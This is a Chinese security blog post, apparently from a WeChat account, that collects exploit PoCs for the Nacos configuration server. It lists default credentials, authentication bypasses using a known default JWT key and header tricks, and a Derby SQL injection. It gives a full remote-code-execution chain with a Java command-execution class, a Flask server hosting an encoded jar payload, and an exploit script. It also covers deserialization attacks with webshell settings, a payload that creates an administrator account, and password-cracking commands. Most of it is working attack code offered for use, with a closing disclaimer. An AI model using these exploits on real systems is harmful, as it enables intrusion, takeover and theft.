#  【Nacos】漏洞利用Poc整理   
 哈拉少安全小队   2024-10-05 09:54  
  
## 弱口令  
  
默认账号密码都是nacos  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4PPLPmd3CKGuF0YLxl1H6CEF3z7hIreRkbTTghPXWlPTeia8bkXCqPF0OeX56dn4BRpYCMY8KcdPxg/640?wx_fmt=png&from=appmsg "")  
## 未授权访问  
### auth  
  
产生原因，配置文件nacos.core.auth.enabled = false  
  
查看用户：http://xxx/nacos/v1/auth/users?pageNo=1&pageSize=1  
  
添加用户：  
```
POST /nacos/v1/auth/users HTTP/1.1

username=test1&password=test1

```  
### JWT QVD-2023-6271  
  
nacos <=2.2.0  
  
产生原因，虽然nacos.core.auth.enabled = true，但是未修改默认nacosKeynacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789  
  
JWT设置Header为HS256，payload中exp为较大时间戳（比如当前时间+5小时后的时间）unix时间戳转换的结果，签名就是用前面的key并且base64编码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4PPLPmd3CKGuF0YLxl1H6CEdRPjPFXSYlxbD8rZmf7qaDGEnFYF0FE63l9Tep9JfSJkuUf0uEVcyg/640?wx_fmt=png&from=appmsg "")  
  
获得登录的JSESSIONID：  
```
POST /nacos/v1/auth/users/login HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMTM1NTEwMH0.zKH8OPXeQP6Eo7tMVPVb09Kb7RiI63ydLqUt57MOlsI

username=admin&password=admin

```  
  
拿到JSESSIONID添加到这个请求里，再请求就登录成功了  
### identity  
  
Nacos <= 2.2.0  
  
产生原因，配置文件写了nacos.core.auth.server.identity.key=serverIdentity以及nacos.core.auth.server.identity.value=security  
  
添加用户：  
```
POST /nacos/v1/auth/users HTTP/1.1
serverIdentity: security

username=test&password=test

```  
### userAgent CVE-2021-29441  
  
Nacos <= 1.4.1  
  
产生原因，配置文件nacos.core.auth.enable.userAgentAuthWhite=true  
```
GET /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken= HTTP/1.1
User-Agent: Nacos-Serverver

```  
  
修复之后产生一个新问题，可以在users后面添加/绕过校验  
  
比如：  
- 访问用户列表curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9 --path-as-is'  
  
- 添加新用户curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test'  
  
## derby SQL注入 CNVD-2020-67618  
  
Poc：http://xxx/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20  
## removal接口RCE CVE-2021-29442  
  
远程加载jar包，使用derby数据库中的执行命令功能去执行jar包中的命令造成RCE（远程服务器上的jar包导入数据库，就可以动态调用类中的static方法）  
  
直接在removal执行select是通不过的，因此先在removal处构造恶意自定义函数，再在derby接口通过select触发这个函数从而实现rce的功能  
  
构造恶意类：  
```
package test.poc;
 
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;
 
public class Example {
    public Example() {
    }
 
    public static void main(String[] args) {
        String ret = exec("ipconfig");
        System.out.println(ret);
    }
 
    public static String exec(String cmd) {
        StringBuffer bf = new StringBuffer();
 
        try {
            String charset = "utf-8";
            String osName = System.getProperty("os.name");
            if (osName != null && osName.startsWith("Windows")) {
                charset = "gbk";
            }
 
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis, charset);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
 
            while((line = br.readLine()) != null) {
                bf.append(line);
            }
        } catch (Exception var10) {
            StringWriter writer = new StringWriter();
            PrintWriter printer = new PrintWriter(writer);
            var10.printStackTrace(printer);
 
            try {
                writer.close();
                printer.close();
            } catch (IOException var9) {
            }
 
            return "ERROR:" + writer.toString();
        }
 
        return bf.toString();
    }
}

```  
  
启动恶意服务端：python server.py，把上面的恶意类通过b64压缩处理，加载在flask服务端当作服务器资源  
```
###python server.py
import base64
from flask import Flask, send_file,Response
import config
 
server_host = '127.0.0.1'
server_port = 5000
##java恶意数据：
payload = b'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'
 
app = Flask(__name__)
 
@app.route('/download')
def download_file():
    data = base64.b64decode(payload)
    response = Response(data, mimetype="application/octet-stream")
    # response.headers["Content-Disposition"] = "attachment; filename=file.bin"
    return response
 
if __name__ == '__main__':
    app.run(host=server_host, port=server_port)

```  
  
利用脚本：python exploit.py  
```
利用：python exploit.py
import random
import sys
import requests
from urllib.parse import urljoin
import config
 
def exploit(target, command, service):
    removal_url = urljoin(target,'/nacos/v1/cs/ops/data/removal')
    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
    for i in range(0,sys.maxsize):
        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',8))
        post_sql = """CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n        CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\n""".format(id=id,service=service);
        option_sql = "UPDATE ROLES SET ROLE='1' WHERE ROLE='1' AND ROLE=S_EXAMPLE_{id}('{cmd}')\n".format(id=id,cmd=command);
        get_sql = "select * from (select count(*) as b, S_EXAMPLE_{id}('{cmd}') as a from config_info) tmp /*ROWS FETCH NEXT*/".format(id=id,cmd=command);
        #get_sql = "select * from users /*ROWS FETCH NEXT*/".format(id=id,cmd=command);
        files = {'file': post_sql}
        post_resp = requests.post(url=removal_url,files=files)
        post_json = post_resp.json()
        if post_json.get('message',None) is None and post_json.get('data',None) is not None:
            print(post_resp.text)
            get_resp = requests.get(url=derby_url,params={'sql':get_sql})
            print(get_resp.text)
            break
 
if __name__ == '__main__':
    service = 'http://{host}:{port}/download'.format(host=config.server_host,port=config.server_port)
    target = 'http://127.0.0.1:8848'
    command = 'calc'
    target = input('请输入目录URL，默认：http://127.0.0.1:8848：') or target
    command = input('请输入命令，默认：calc：') or command
    exploit(target=target, command=command,service=service)

```  
  
执行python exploit.py输入url和cmd即可rce  
## Hessian 反序列化 CNVD-2023-45001  
  
1.4.0 <= Nacos < 1.4.6  
  
2.0.0 <= Nacos < 2.2.3  
  
Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化  
```
工具https://github.com/c0olw/NacosRce一把嗦
哥斯拉
设置请求头x-client-data:godzilla  
设置Referer:https://www.google.com/
路径：URL+/nacos/
密码是pass 和 key
加密器是JAVA_AES_BASE64

```  
## Nacos-Client Yaml反序列化  
```
工具：https://github.com/charonlight/NacosExploitGUI
须获得Nacos Server控制台权限，修改已有的配置为Yaml Payload进行盲打客户端的攻击

```  
  
利用过程：  
```
// 下载yaml-payload：https://github.com/artsploit/yaml-payload/，修改其中的命令执行参数
Runtime.getRuntime().exec("net user hacker Admin@123");
Runtime.getRuntime().exec("net localgroup administrators hacker /add");

```  
  
编译  
```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .

```  
  
python -m http.server 12345起一个web服务，在NacosExploitGUI工具中Jar路径设定成http://xxxx:12345/yaml-payload.jar，dataId设定成后台配置列表中的dataId，比如db-config即可执行  
## 密码解密  
### nacos密码bcrypt  
```
hashcat -a 0 -m 3200 hashes.txt rockyou.txt -w 3 -O -D 1,2 --show

```  
### 配置文件密文 jasypt  
```
java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringEncryptionCLI input="123456" password="salt123" algorithm="PBEWithMD5AndDES"
java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringDecryptionCLI input="MecKdyPwwkD+AqUKPy1GlQ==" password="salt123" algorithm="PBEWithMD5AndDES"

```  
## 一些路径记录  
```
http://127.0.0.1:8848/nacos/v1/console/server/state
http://xx.xx.xx.xx/v1/console/server/state
http://127.0.0.1:8848/nacos/v1/auth/users?search=accurate&pageNo=1&pageSize=9   get查询用户
curl -v --data-binary "username=test&password=123456" "http://127.0.0.1:8848/nacos/v1/auth/users"  post添加用户
curl -X PUT 'http://127.0.0.1:8848/nacos/v1/auth/users?accessToken=' -d 'username=test&newPassword=test123'  修改密码
http://127.0.0.1:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99  获取配置信息
http://127.0.0.1:8848/nacos/v1/core/cluster/nodes  获取集群信息
curl --data-binary "username=nacos&password=nacos" "http://127.0.0.1:8848/nacos/v1/auth/users/login"  登陆

```  
  
  
  
    公众号技术文章仅供诸位网络安全工程师对自己所管辖的网站、服务器、网络进行检测或维护时参考用，公众号的检测工具仅供各大安全公司的安全测试员安全测试使用。  
  
    未经允许请勿利用文章里的技术资料对任何外部计算机系统进行入侵攻击，公众号的各类工具均不得用于任何非授权形式的安全测试。  
  
    公众号仅提供技术交流，不对任何成员利用技术文章或者检测工具造成任何理论上的或实际上的损失承担责任。  
  
